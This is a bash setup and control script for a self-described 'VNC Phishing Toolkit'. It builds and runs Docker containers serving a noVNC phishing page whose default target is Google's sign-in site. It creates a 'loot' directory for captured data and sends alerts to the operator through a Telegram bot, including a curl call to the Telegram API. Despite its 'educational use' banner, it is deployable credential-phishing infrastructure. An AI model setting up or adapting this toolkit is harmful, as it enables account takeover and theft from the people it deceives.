#!/bin/bash

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║           VNC Phishing Toolkit - Setup                    ║"
echo "║                  For Educational Use Only                 ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check for Docker
if ! command -v docker &> /dev/null; then
    echo -e "${RED}Error: Docker is not installed${NC}"
    echo "Please install Docker first: https://docs.docker.com/get-docker/"
    exit 1
fi

if ! command -v docker-compose &> /dev/null && ! docker compose version &> /dev/null; then
    echo -e "${RED}Error: Docker Compose is not installed${NC}"
    exit 1
fi

# Determine docker compose command
if docker compose version &> /dev/null; then
    COMPOSE="docker compose"
else
    COMPOSE="docker-compose"
fi

# Handle commands
case "${1:-install}" in
    install)
        echo -e "${GREEN}[+] Setting up VNC Phishing Toolkit...${NC}"
        
        # Create directories
        echo -e "${BLUE}[*] Creating directories...${NC}"
        mkdir -p data loot certs
        
        # Check for .env file
        if [ ! -f .env ]; then
            echo -e "${YELLOW}[!] No .env file found. Creating from template...${NC}"
            cp .env.example .env
            echo -e "${YELLOW}[!] Please edit .env with your Telegram credentials${NC}"
            echo ""
            echo "To get Telegram credentials:"
            echo "  1. Message @BotFather on Telegram to create a bot"
            echo "  2. Copy the bot token to TELEGRAM_BOT_TOKEN"
            echo "  3. Message @userinfobot to get your chat ID"
            echo "  4. Copy the chat ID to TELEGRAM_CHAT_ID"
            echo ""
        fi
        
        # Make scripts executable
        chmod +x novnc/scripts/*.sh 2>/dev/null || true
        
        # Build containers
        echo -e "${BLUE}[*] Building Docker containers...${NC}"
        $COMPOSE build
        
        echo -e "${GREEN}[+] Setup complete!${NC}"
        echo ""
        echo "Next steps:"
        echo "  1. Edit .env with your configuration"
        echo "  2. Run: ./setup.sh run"
        ;;
    
    run)
        echo -e "${GREEN}[+] Starting VNC Phishing Toolkit...${NC}"
        
        # Load environment
        if [ -f .env ]; then
            export $(grep -v '^#' .env | xargs)
        fi
        
        # Start containers
        $COMPOSE up -d
        
        echo ""
        echo -e "${GREEN}[+] Services started!${NC}"
        echo ""
        echo "Dashboard: http://localhost:80"
        echo "noVNC:     http://localhost:80/novnc/vnc.html"
        echo ""
        echo "Target URL: ${TARGET_URL:-https://accounts.google.com}"
        echo ""
        
        # Check Telegram config
        if [ -z "$TELEGRAM_BOT_TOKEN" ] || [ "$TELEGRAM_BOT_TOKEN" = "your_bot_token_here" ]; then
            echo -e "${YELLOW}[!] Telegram not configured - alerts disabled${NC}"
        else
            echo -e "${GREEN}[+] Telegram alerts enabled${NC}"
        fi
        ;;
    
    stop)
        echo -e "${YELLOW}[*] Stopping containers...${NC}"
        $COMPOSE down
        echo -e "${GREEN}[+] Stopped${NC}"
        ;;
    
    logs)
        $COMPOSE logs -f ${2:-}
        ;;
    
    status)
        $COMPOSE ps
        ;;
    
    clean)
        echo -e "${RED}[!] This will remove all data and containers${NC}"
        read -p "Are you sure? (y/N) " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            $COMPOSE down -v --rmi all
            rm -rf data/* loot/*
            echo -e "${GREEN}[+] Cleaned${NC}"
        fi
        ;;
    
    test-telegram)
        echo -e "${BLUE}[*] Testing Telegram connection...${NC}"
        
        if [ -f .env ]; then
            export $(grep -v '^#' .env | xargs)
        fi
        
        if [ -z "$TELEGRAM_BOT_TOKEN" ] || [ "$TELEGRAM_BOT_TOKEN" = "your_bot_token_here" ]; then
            echo -e "${RED}Error: TELEGRAM_BOT_TOKEN not configured${NC}"
            exit 1
        fi
        
        if [ -z "$TELEGRAM_CHAT_ID" ] || [ "$TELEGRAM_CHAT_ID" = "your_chat_id_here" ]; then
            echo -e "${RED}Error: TELEGRAM_CHAT_ID not configured${NC}"
            exit 1
        fi
        
        # Send test message
        RESPONSE=$(curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -H "Content-Type: application/json" \
            -d "{\"chat_id\": \"${TELEGRAM_CHAT_ID}\", \"text\": \"🧪 Test message from VNC Phishing Toolkit\", \"parse_mode\": \"HTML\"}")
        
        if echo "$RESPONSE" | grep -q '"ok":true'; then
            echo -e "${GREEN}[+] Telegram test successful!${NC}"
        else
            echo -e "${RED}[-] Telegram test failed${NC}"
            echo "$RESPONSE"
        fi
        ;;
    
    *)
        echo "Usage: $0 {install|run|stop|logs|status|clean|test-telegram}"
        echo ""
        echo "Commands:"
        echo "  install        - Initial setup and build containers"
        echo "  run            - Start all services"
        echo "  stop           - Stop all services"
        echo "  logs [service] - View logs (optional: specify service)"
        echo "  status         - Show container status"
        echo "  clean          - Remove all data and containers"
        echo "  test-telegram  - Test Telegram bot connection"
        exit 1
        ;;
esac
